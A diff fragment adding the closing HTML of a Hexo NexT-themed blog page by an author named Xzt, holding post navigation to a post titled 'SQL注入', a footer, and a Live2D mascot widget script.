+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/15/SQL%E6%B3%A8%E5%85%A5/" rel="next" title="SQL注入">
+                  SQL注入 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Xzt</span>
+  </div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
